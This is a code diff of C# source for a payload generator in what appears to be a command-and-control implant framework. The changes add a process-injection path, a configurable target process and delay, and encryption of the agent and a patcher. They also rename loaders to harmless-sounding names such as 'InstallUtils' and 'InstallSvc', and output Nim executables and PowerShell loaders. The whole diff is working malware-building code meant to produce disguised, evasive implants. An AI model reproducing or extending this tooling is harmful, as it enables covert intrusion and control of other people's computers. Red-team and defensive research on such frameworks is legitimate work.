@@ -47,26 +47,33 @@ public partial class PayloadGenerator
         return Path.Combine(this.Config.WorkingFolder, fileName);
     }
 
-
-
     public byte[] GeneratePayload(PayloadGenerationOptions options)
     {
-        var agentbytes = PrepareAgent(options);
+        byte[] agentbytes = null;
+        if (options.IsInjected  && options.Type != PayloadType.Library)
+        {
+            agentbytes = PrepareAgent(options, false);
+            agentbytes = PrepareInjectedAgent(options, agentbytes, options.Type == PayloadType.Service);
+        }
+        else
+        {
+            agentbytes = PrepareAgent(options, options.Type == PayloadType.Service);
+        }
+
         switch (options.Type)
         {
-            case PayloadType.Executable: return this.GenerateExecutable(options, agentbytes);
-            case PayloadType.PowerShell: return this.GeneratePowershell(options, agentbytes);
+            case PayloadType.Executable: return this.ExecutableEncapsulation(options, agentbytes);
+            case PayloadType.PowerShell: return this.PowershellEncapsulation(options, agentbytes);
             case PayloadType.Library: return this.GenerateLibrary(options,agentbytes);
-            case PayloadType.Injector: return this.GenerateInjector(options, agentbytes);
             case PayloadType.Service: return agentbytes;
-            case PayloadType.Binary: return this.GenerateBinary(options, agentbytes);
+            case PayloadType.Binary: return this.BinaryEncapsulation(options, agentbytes);
             default:
                 throw new NotImplementedException();
 
         }
     }
 
-    public byte[] GenerateExecutable(PayloadGenerationOptions options, byte[] agent)
+    public byte[] ExecutableEncapsulation(PayloadGenerationOptions options, byte[] agent)
     {
         string nimSourceCode = string.Empty;
         string agentb64 = Convert.ToBase64String(agent);
@@ -124,7 +131,7 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] GenerateBinary(PayloadGenerationOptions options, byte[] agent)
+    public byte[] BinaryEncapsulation(PayloadGenerationOptions options, byte[] agent)
     {
         var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
         var tmpPath = this.Working(tmpFile);
@@ -158,6 +165,12 @@ public partial class PayloadGenerator
 
     public byte[] GenerateLibrary(PayloadGenerationOptions options, byte[] agent)
     {
+        if(!options.IsInjected)
+        {
+            this.MessageSent?.Invoke(this, $"[X] Only injected payload is allowed for Library type!");
+            return null;
+        }
+
         string nimSourceCode = string.Empty;
 
         var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
@@ -213,7 +226,106 @@ public partial class PayloadGenerator
         return bytes;
     }
 
-    public byte[] GenerateInjector(PayloadGenerationOptions options, byte[] agent)
+    public byte[] PowershellEncapsulation(PayloadGenerationOptions options, byte[] agent)
+    {
+        string psSourceCode = string.Empty;
+        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
+        {
+            psSourceCode = psReader.ReadToEnd();
+        }
+
+        //var payload = new StringBuilder();
+        //foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
+        //{
+        //    payload.Append("b64 = b64 & \"");
+        //    payload.Append(chunk);
+        //    payload.Append("\"");
+        //    payload.Append(Environment.NewLine);
+        //}
+        var payload = this.Encode(agent);
+
+        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
+        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());
+
+        var psPath = this.Working(psFile);
+        using (var writer = new StreamWriter(psPath))
+        {
+            writer.WriteLine(psSourceCode);
+        }
+
+        byte[] bytes = File.ReadAllBytes(psPath);
+
+
+        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));
+
+
+        return bytes;
+    }
+
+    public byte[] PrepareAgent(PayloadGenerationOptions options, bool isService)
+    {
+        //Console.WriteLine("Generating encrypted Agent");
+
+        this.MessageSent?.Invoke(this, $"Configuring Agent...");
+        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));
+
+        this.MessageSent?.Invoke(this, $"Using Endpoint {options.Endpoint}...");
+        this.MessageSent?.Invoke(this, $"Using ServerKey {options.ServerKey}...");
+
+        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
+        {
+            { "EndPoint", options.Endpoint.ToString() },
+            { "Key", options.ServerKey ?? String.Empty }
+        });
+
+
+        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
+        var encAgent = this.Encrypt(agent);
+        var agentb64 = this.Encode(encAgent.Encrypted);
+
+
+        this.MessageSent?.Invoke(this, $"Creating Patcher...");
+        //Create Patcher
+        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
+
+        var encPatcher = this.Encrypt(patchDll);
+        var patcherb64 = this.Encode(encPatcher.Encrypted);
+
+        if (!isService)
+        {
+            this.MessageSent?.Invoke(this, $"Creating Starter...");
+            //Create Starter
+            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
+            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
+                    {
+                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
+                        { "PatchKey", encPatcher.Secret },
+                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Key", encAgent.Secret }
+                    });
+            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
+            return resultAgent;
+        }
+        else
+        {
+            this.MessageSent?.Invoke(this, $"Creating Service...");
+            //Create Starter
+            var service = LoadAssembly(this.Source(ServiceSrcFile, options.Architecture, options.IsDebug));
+            service = AssemblyEditor.ReplaceRessources(service, new Dictionary<string, object>()
+                    {
+                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
+                        { "PatchKey", encPatcher.Secret },
+                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Key", encAgent.Secret }
+                    });
+            var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
+            return resultAgent;
+        }
+
+        return null;
+    }
+
+    public byte[] PrepareInjectedAgent(PayloadGenerationOptions options, byte[] agent, bool isService)
     {
         #region binary
         var tmpFile = "tmp" + ShortGuid.NewGuid() + ".exe";
@@ -252,156 +364,22 @@ public partial class PayloadGenerator
         this.MessageSent?.Invoke(this, $"BinLength = {binBytes.Length}");
 
         var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));
+
+        string process = options.Architecture == PayloadArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
+        if(!string.IsNullOrEmpty(options.InjectionProcess))
+            process = options.InjectionProcess;
+
         injDll = AssemblyEditor.ReplaceRessources(injDll, new Dictionary<string, object>()
                     {
                         { "Payload", binBytes },
-                        { "Host", options.Architecture == PayloadArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86 }
+                        { "Host",  process},
+                        { "Delay", options.InjectionDelay.ToString() },
                     });
 
-        var encInject= this.Encrypt(injDll);
+        var encInject = this.Encrypt(injDll);
         var injectb64 = this.Encode(encInject.Encrypted);
 
-        this.MessageSent?.Invoke(this, $"Creating Starter...");
-        //Create Starter
-        var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture, options.IsDebug));
-        starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
-                    {
-                        { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
-                        { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
-                        { "Key", encInject.Secret }
-                    });
-        var resultInjector = AssemblyEditor.ChangeName(starter, "InstallUtils");
-        //File.WriteAllBytes("/mnt/Share/tmp/injector.exe", resultInjector);
-        #endregion
-
-        #region executable
-
-        this.MessageSent?.Invoke(this, $"[>] Generating Executable...");
-        string nimSourceCode = string.Empty;
-        string agentb64 = Convert.ToBase64String(resultInjector);
-        using (var nimReader = new StreamReader(this.Source("payload.nim", options.Architecture, options.IsDebug)))
-        {
-            nimSourceCode = nimReader.ReadToEnd();
-        }
-
-        var payload = new StringBuilder();
-        foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
-        {
-            payload.Append("b64 = b64 & \"");
-            payload.Append(chunk);
-            payload.Append("\"");
-            payload.Append(Environment.NewLine);
-        }
-
-        var nimFile = "tmp" + ShortGuid.NewGuid() + ".nim";
-        nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());
-
-        var nimPath = this.Working(nimFile);
-        using (var writer = new StreamWriter(nimPath))
-        {
-            writer.WriteLine(nimSourceCode);
-        }
-
-        outFile = "tmp" + ShortGuid.NewGuid() + ".exe";
-        outPath = this.Working(outFile);
-
-        var parms = this.ComputeNimBuildParameters(nimPath, outPath, options.Architecture == PayloadArchitecture.x86, options.IsDebug);
-
-
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, $"[>] Executing: nim {string.Join(" ", parms)}");
-        executionResult = this.NimBuild(parms);
-
-        if (options.IsVerbose)
-            this.MessageSent?.Invoke(this, executionResult.Out);
-
-        if (options.IsVerbose)
-            if (executionResult.Result == 0)
-                this.MessageSent?.Invoke(this, "[*] Executable generation succeed.");
-            else
-                this.MessageSent?.Invoke(this, "[X] Executable generation failed.");
-
-        File.Delete(nimPath);
-
-        if (executionResult.Result != 0)
-            return null;
-
-        byte[] bytes = File.ReadAllBytes(outPath);
-        File.Delete(outPath);
-
-
-        #endregion
-
-        return bytes;
-    }
-
-    public byte[] GeneratePowershell(PayloadGenerationOptions options, byte[] agent)
-    {
-        string psSourceCode = string.Empty;
-        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture, options.IsDebug)))
-        {
-            psSourceCode = psReader.ReadToEnd();
-        }
-
-        //var payload = new StringBuilder();
-        //foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
-        //{
-        //    payload.Append("b64 = b64 & \"");
-        //    payload.Append(chunk);
-        //    payload.Append("\"");
-        //    payload.Append(Environment.NewLine);
-        //}
-        var payload = this.Encode(agent);
-
-        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
-        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());
-
-        var psPath = this.Working(psFile);
-        using (var writer = new StreamWriter(psPath))
-        {
-            writer.WriteLine(psSourceCode);
-        }
-
-        byte[] bytes = File.ReadAllBytes(psPath);
-
-
-        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));
-
-
-        return bytes;
-    }
-
-    public byte[] PrepareAgent(PayloadGenerationOptions options)
-    {
-        //Console.WriteLine("Generating encrypted Agent");
-
-        this.MessageSent?.Invoke(this, $"Configuring Agent...");
-        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture, options.IsDebug));
-
-        this.MessageSent?.Invoke(this, $"Using Endpoint {options.Endpoint}...");
-        this.MessageSent?.Invoke(this, $"Using ServerKey {options.ServerKey}...");
-
-        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
-        {
-            { "EndPoint", options.Endpoint.ToString() },
-            { "Key", options.ServerKey ?? String.Empty }
-        });
-
-
-        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
-        var encAgent = this.Encrypt(agent);
-        var agentb64 = this.Encode(encAgent.Encrypted);
-
-
-        this.MessageSent?.Invoke(this, $"Creating Patcher...");
-        //Create Patcher
-        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture, options.IsDebug));
-
-        var encPatcher = this.Encrypt(patchDll);
-        var patcherb64 = this.Encode(encPatcher.Encrypted);
-
-        if (options.Type != PayloadType.Service)
+        if (!isService)
         {
             this.MessageSent?.Invoke(this, $"Creating Starter...");
             //Create Starter
@@ -410,13 +388,13 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
-                        { "Key", encAgent.Secret }
+                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
+                        { "Key", encInject.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
             return resultAgent;
         }
-        if (options.Type == PayloadType.Service)
+        else
         {
             this.MessageSent?.Invoke(this, $"Creating Service...");
             //Create Starter
@@ -425,14 +403,15 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
-                        { "Key", encAgent.Secret }
+                        { "Payload", Encoding.UTF8.GetBytes(injectb64) },
+                        { "Key", encInject.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
             return resultAgent;
         }
 
-        return null;
+        #endregion
+
     }
 
     private byte[] LoadAssembly(string filePath)
